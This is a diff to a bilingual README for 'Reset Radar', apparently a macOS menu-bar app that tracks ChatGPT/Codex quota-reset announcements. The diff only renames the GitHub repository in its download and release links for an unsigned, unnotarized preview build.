@@ -15,7 +15,7 @@
 
 ### 下载与环境
 
-**[下载 v0.2.3 · Apple 芯片版](https://github.com/tonyfenwick8814121/reset-radar/raw/refs/heads/main/downloads/Reset-Radar-0.2.3-arm64.zip)**
+**[下载 v0.2.3 · Apple 芯片版](https://github.com/tonyfenwick8814121/reset-radar-for-ChatGPT-Codex/raw/refs/heads/main/downloads/Reset-Radar-0.2.3-arm64.zip)**
 
 需要 **macOS 14+、Apple 芯片（M 系列）和网络连接**。解压后将 `Reset Radar.app` 拖入“应用程序”并打开，无需安装开发工具。
 
@@ -28,7 +28,7 @@
 - 修复 GPT-6 Sol 发布时的手动重置机会漏报。
 - 可信的周二预告会提醒“时间与类型待确认”；正式发放公告会显示适用套餐并提示核对账号。
 
-[完整版本记录](CHANGELOG.md) · [所有下载](https://github.com/tonyfenwick8814121/reset-radar/releases)
+[完整版本记录](CHANGELOG.md) · [所有下载](https://github.com/tonyfenwick8814121/reset-radar-for-ChatGPT-Codex/releases)
 
 ## English
 
@@ -43,7 +43,7 @@ A free macOS menu-bar app that monitors public ChatGPT / Codex quota reset annou
 
 ### Download & requirements
 
-**[Download v0.2.3 · Apple silicon](https://github.com/tonyfenwick8814121/reset-radar/raw/refs/heads/main/downloads/Reset-Radar-0.2.3-arm64.zip)**
+**[Download v0.2.3 · Apple silicon](https://github.com/tonyfenwick8814121/reset-radar-for-ChatGPT-Codex/raw/refs/heads/main/downloads/Reset-Radar-0.2.3-arm64.zip)**
 
 Requires **macOS 14+, Apple silicon (M series) and internet access**. Unzip, drag `Reset Radar.app` into Applications and open it. No developer tools required.
 
@@ -56,4 +56,4 @@ This preview is not Developer ID signed or notarized; macOS may block the first 
 - Fixed missed banked-reset alerts during the GPT-6 Sol launch.
 - Trusted Tuesday promises now show time/type pending; rollout notices name eligible plans and ask users to check their account.
 
-[Version history](CHANGELOG.md) · [All downloads](https://github.com/tonyfenwick8814121/reset-radar/releases)
+[Version history](CHANGELOG.md) · [All downloads](https://github.com/tonyfenwick8814121/reset-radar-for-ChatGPT-Codex/releases)
